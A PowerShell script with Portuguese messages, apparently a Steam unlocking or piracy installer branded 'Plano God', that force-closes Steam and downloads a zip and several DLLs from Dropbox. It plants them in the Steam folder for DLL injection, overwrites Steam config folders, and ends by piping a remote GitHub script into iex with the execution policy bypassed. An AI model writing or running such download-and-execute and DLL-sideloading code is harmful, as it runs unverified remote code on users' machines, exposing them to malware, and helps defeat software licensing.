function Stop-Steam {
    Write-Host "Fechando processos da Steam para liberar arquivos..." -ForegroundColor Yellow
    Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 3
}

function Executar-CloudRedirect {
    Write-Host "`n"
    Log "INFO" "Chamando instalador remoto do CloudRedirect..."
    try {
        powershell -ExecutionPolicy Bypass -Command "irm "https://raw.githubusercontent.com/master18032008/Fixinternet/refs/heads/main/Fixinternet" | iex"
        Log "OK" "Injecao do CloudRedirect concluida via Web Script."
    } catch {
        Log "ERR" "Nao foi possivel rodar o CloudRedirect."
    }
}

function Executar-Instalacao {
    param ($Modo)
    Stop-Steam
    Show-Header
    
    # Diretório temporário fixo e seguro
    $tmp = "C:\GameOver_Download_Tmp"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $tmp | Out-Null
    
    $nomeArquivo = Join-Path $tmp "PlanoGod.zip"
    # Link atualizado fornecido por você com final corrigido para dl=1
    $urlDoZip = "https://www.dropbox.com/scl/fi/6s1hc2oued05w9q7ke8si/GameOverGod.zip?rlkey=paxhjca32gfd4wgy2n4rx33kw&st=dh1hpkui&dl=1" 
    
    Write-Host "Baixando arquivos da biblioteca..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $urlDoZip -OutFile $nomeArquivo -ErrorAction Stop
        Write-Host "Download concluido com sucesso!" -ForegroundColor Green
    } catch {
        Write-Host "ERRO: Falha no download do Dropbox. Verifique o link." -ForegroundColor Red
        if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
        Pause; return
    }
    
    Write-Host "Sincronizando DLLs de sistema..." -ForegroundColor Cyan
    $dlls = @{ 
        "xinput1_4.dll" = "https://www.dropbox.com/scl/fi/t9myageazhyj0zbqcamlb/update?rlkey=6ulsymhfdrpeh65n4k6fu4cgv&st=nu66xrcm&dl=1"
        "dwmapi.dll"    = "https://www.dropbox.com/scl/fi/ry3nm7ywgdgrdzduye8w0/dwmapi?rlkey=yrdi65cmcv78g5qibgjfprpll&st=kbx6rd56&dl=1" 
    }
    foreach ($name in $dlls.Keys) {
        try { 
            $targetDllPath = Join-Path $steamDir $name
            Invoke-WebRequest -Uri $dlls[$name] -OutFile $targetDllPath -ErrorAction SilentlyContinue 
        } catch {}
    }

    Write-Host "Extraindo arquivos estruturais..." -ForegroundColor Cyan
    try {
        Expand-Archive -Path $nomeArquivo -DestinationPath $tmp -Force
        
        # BUSCA RECURSIVA AVANÇADA (Entra em qualquer pasta que o WinRAR tenha gerado automaticamente)
        $pastaConfigZip = Get-ChildItem -Path $tmp -Recurse -Directory -Filter "Config" | Select-Object -First 1
        $arquivoHid = Get-ChildItem -Path $tmp -Recurse -File -Filter "Hid.dll" | Select-Object -First 1
        
        if (-not $pastaConfigZip -and -not $arquivoHid) {
            throw "Arquivos essenciais nao localizados no pacote compactado."
        }

        # Limpezas prévias necessárias na Steam
        if (Test-Path "$configDir\stplug-in") { Remove-Item "$configDir\stplug-in" -Recurse -Force -ErrorAction SilentlyContinue }
        if (Test-Path "$configDir\depotcache") { Remove-Item "$configDir\depotcache" -Recurse -Force -ErrorAction SilentlyContinue }

        # Copia com inteligência de caminhos dinâmicos
        if ($pastaConfigZip) { 
            Copy-Item -Path "$($pastaConfigZip.FullName)\*" -Destination "$configDir\" -Recurse -Force 
        }
        if ($arquivoHid) { 
            Copy-Item -Path $arquivoHid.FullName -Destination "$steamDir\" -Force 
        }
        
        if ($Modo -eq "Full") {
            $folders = @("cache", "temp", "tmp")
            foreach ($f in $folders) { 
                $p = Join-Path $steamDir $f
                if (Test-Path $p) { Remove-Item "$p\*" -Recurse -Force -ErrorAction SilentlyContinue }
            }
        }
        Write-Host "`nPLANO GOD INSTALADO COM SUCESSO!" -ForegroundColor Green
    } catch {
        Write-Host "ERRO: Nao foi possivel extrair e validar a estrutura interna do ZIP." -ForegroundColor Red
        Write-Host $_.Exception.Message -ForegroundColor DarkRed
    }
    
    # Limpeza final segura
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    
    Executar-CloudRedirect
}

